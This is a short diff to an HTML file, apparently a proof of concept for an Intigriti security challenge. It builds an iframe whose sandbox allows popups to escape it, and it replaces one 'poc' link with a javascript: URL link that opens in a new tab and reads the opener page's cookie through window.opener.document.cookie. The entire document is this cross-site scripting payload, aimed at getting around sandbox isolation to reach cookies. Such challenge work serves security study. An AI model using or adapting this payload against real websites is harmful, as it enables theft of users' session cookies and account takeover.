@@ -8,7 +8,7 @@
     iframe.sandbox = 'allow-popups-to-escape-sandbox'
     document.body.appendChild(iframe);
   </script>
-  <a href="https://challenge.intigriti.io/static/4/challenge1.png" target="javascript:alert(document.location)">poc</a>
+  <a target="_blank" href="javascript:alert(window.opener.document.cookie);">poc1</a>
 </body>
 
 </html>
